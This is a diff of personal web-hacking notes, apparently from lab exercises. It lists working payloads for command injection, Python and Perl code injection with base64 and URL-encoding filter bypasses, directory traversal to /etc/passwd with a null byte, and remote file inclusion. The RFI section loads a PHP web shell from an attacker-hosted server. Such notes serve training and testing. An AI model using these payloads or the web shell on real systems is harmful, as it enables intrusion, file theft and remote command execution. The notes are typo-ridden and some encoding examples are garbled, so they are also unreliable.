@@ -1,21 +1,21 @@
----------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                   XSS tricks
----------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Pick a payload : 123'"<t>
 Inject the payload
 see how it gets reflected in pages
 Iterate on the payload to execute JavaScript
 Search and page and check if your script broke the html code
 Dont fuzz blindly but check the context in which your payload is echoed back in the page
-----------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 HTML encoding bypass : 
 Named : < &lt;  | > &ht; 
 Hex : <  0x3ce ---> &#x3e; | " 0x22 ---> &#x22; | & 0x26 ---> &#x26;
 Decimal : ' decimal value 39 ---> &#39; | < 60 ---> &#60
 How does  encoding impact Xss
-----------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                         Code execution PHP web app [0]
-----------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Command injection can be used to run arbitrary commands on a server.
 
 Multiple payloads can be used to trigger this behaviour. For example, let’s say that the initial command is:
@@ -29,15 +29,15 @@ command1 && command2 that will run command2 if command1 succeeds.
 command1 || command2 that will run command2 if command1 fails.
 command1 ; command2 that will run command1 then command2.
 command1 | command2 that will run command1 and send the output of command1 to command2.
-----------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                         Code execution PHP web app [1]
-----------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 In this case the developer fixed the issue from the previous one and has started filtering on some special characters.
 However, the developer forgot that you can use `command` to run a command.
 So when we inject somthing like ?ip=`id` we got this output : ping -c 2 `id` no errors and our command is printed back, it may sems like its not executed but who nows maybe its a blind injection so to make sure if it executed or not, we can inject a revers shell and check if we can get a reverse connection to our machine
-----------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                         Code execution PHP web app [2]
-----------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 In this challenge, the developer fixed the previous issue and is now filtering on even more special characters.
 However, the developer forgot that you can use $(command) to run a command.
 So our bypass will be like this :
@@ -45,18 +45,18 @@ So our bypass will be like this :
 1/ using the sleep command and compare time of responding $(sleep 10) so we should wait 10 second before getting the page.
 2/ ping an exernal host that we own and check the logs
 3/ curl  to read or download a file from our own server and check the logs
-----------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                         Code execution Paython web app: [0]
-----------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Even if the path is like this Target/hello/hacker
 try to add " or ' at the end of its cause its maybe taking parametters, if you got an error,
 try to craft a payload that bypass this error then develop your exploit
 somme times you will have RCE but your payload wont work for example
 os.system('id') this may be beacuse the module os is not imported, so one thing we can do 
 __import__('os').system('id') this may not work for many reasons so we need to play with the payload so it match our entry case we can use somthing like this "%2bstr(__import__('os').popen('id').read())%2b"
------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                         Code execution Paython web app: [1]
------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 In other cases the first payload may not work because of some kind of restrinction maybe a waf, so we need to try encoding somthing like this "%2bstr(__import__('os').popen('"cat%20%252FEtc%252FPasswd').read())%2b"
 Here we werent able to execute or normal "cat /etc/passwd" and by playing with the payload we understood that the "/" is the character that cause the error, so by urlencoding it we bypassed the error but with no result!
 so lets try somthing else Base64 for example :
@@ -66,9 +66,9 @@ exec (base64encode(payload))
 import base65; b64decode(...)
 __import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dkCg==')
 " + str(__import__('os').popen(__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dkCg==')).read()) +"
--------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                         Code injection in Perl: [0]
--------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 So in this application we have an endpoit like this :
 http://Target/#hacker and by itercepting request using developer tool we can see that a page with this parametres load /cgi-bin/hello?name=hacker so if we go to it we will get json result :
 {"str":"Hello hacker"}
@@ -81,9 +81,9 @@ So we know that '' can be used give us an empty string so what if we concatanat 
 5] http://Target/cgi-bin/hello?name=hacker'.id.' ---> {"str":""} Notworking id is just printed!
 What about using backtiks to make try making id command executable
 6] http://Target/cgi-bin/hello?name=hacker'.`id`.' ---> {"str":"Hello hackeruid=33(www-data) gid=33(www-data) groups=33(www-data) [Voilla]
----------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                         Directory Traversals
----------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Directory traversals come from a lack of filtering/encoding of information used as part of a path by an application.
 
 As with other vulnerabilities, you can use the "same value technique" to test for this type of issue.
@@ -112,28 +112,62 @@ For example, the following PHP code is supposed to add the parameter `id` to get
 On Linux, you won't be able to exploit this vulnerability if there is no directory starting with example_, whereas on Windows, you will be able to exploit it, even if there is no such directory.
 
 $file = "/var/files/example_".$_GET['id'].".txt";
----------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 									Directory Traversals case [0]
----------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 In this case wr have a target : http://target/ with an image in the page, after looking in the source code we can see that the image link is like this :
 Target/file.php?file=hacker.png so the image hacker.png has been called with the file parameter so as said before we can try to call another file /etc/passwd
 and see it itd gonna work !
 the final payload will be like this : ../../../../../../../../etc/passwd 
----------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 									Directory Traversals case [1]
----------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 In this case we have the same target but this time the files are called using the full path : Target/file.php?file=/var/www/hacker.png
 So basicaly our first payload won't work and its normal because the path is different, but the bypass here is very simple, all we need to do is to keep
 the original path and add out payload /var/www/../../../../../../../../etc/passwd 
----------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 									Directory Traversals case [2]
----------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 In this case we still have the same target with the same vulnerable endpoint, but this time we have a filter that stop us from execuring our payload
 so this time Target/file.php?file=/var/www/hacker with no png extension which is mean that the extension is added by the server after loading the code in the page
 So basicaly after using our payload ../../../../../../../../etc/passwd the server will add .png at the end of it and it will not be executed since its not correct
 To bypass this kind of filters, we can use null byte [%00] so our new payload will be ../../../../../../../../etc/passwd%00 this will eliminate the extension added by the server 
 and yeah we get the content of our passwd file!
----------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 									          File Include
----------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+In many applications, developers need to include files to load classes or to share some templates between multiple web pages.
 
+"File Include" vulnerabilities come from a lack of filtering, in particular when a user-controlled parameter is used as part of a file name, in a call to an including function (require, require_once, include or include_once in PHP for example).
+
+If the call to one of these methods is vulnerable, an attacker will be able to manipulate the function to load their own code.
+
+"File Include" vulnerabilities can also be used as a directory traversal to read arbitrary files.
+
+However, if the arbitrary code contains an opening PHP tag, the file will be interpreted as PHP code.
+
+This including function can allow the loading of local or remote resources (a website, for example). If vulnerable, it will lead to:
+
+Local File Include: LFI. A local file is read and interpreted.
+Remote File Include: RFI. A remote file is retrieved and interpreted.
+By default, PHP disables loading of remote files, thanks to the configuration option: allow_url_include.
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+									          File Include [0]
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+In this first case out taget  is like this : http://target/?page=home.php our target is calling the home.php page with the parameter page, we can check if we have
+a file inclision vulnrability by calling somthing weird like " or / or ' blabla or anything that dosen't exist on the server!
+so we trigger an error :
+Warning: include(blabla): failed to open stream: No such file or directory in /var/www/index.php on line 13
+Warning: include(): Failed opening 'blabla' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/index.php on line 13
+The objective of this exercise is to find the File Include vulnerability in this page.
+By having this error we know that the vulnrability existe we can also have an idea about the path of the application!
+So first thing we can do with this vuln, its to use it as a path traversal and read files like /etc/passwd or we can use it to have RCE
+Since File inclusion work for internal files and also remore file the idea is that we gonna host a malicious file in our external Server then we call it
+In my server i created poc.txt file with this code inside : <?php system($_GET['c']); ?>  so the location of the file now is IPofmyServer/poc.txt
+By tring to call this file pour payload will be : Target/?page=http://IPofmyServer/poc.txt but unfortunatly we will get an error that says c variable is not defined!
+You may think yes its noral because we need to passe it like poc.txt?c=cmd, but in fact our malicious file is not a PHP file but its a TXT!
+Basicaly the payload will work fine if the poc was .PHP but the out put will not be from out target but from our server, so how to do it with .TXT file ?
+Its so simple we will need to passe the c varible like this poc.txt&c=cmd so our final exploit will be like this : Target/?page=http://IPofmyServer/poc.txt&c=cmd
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+									          File Include [1]
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
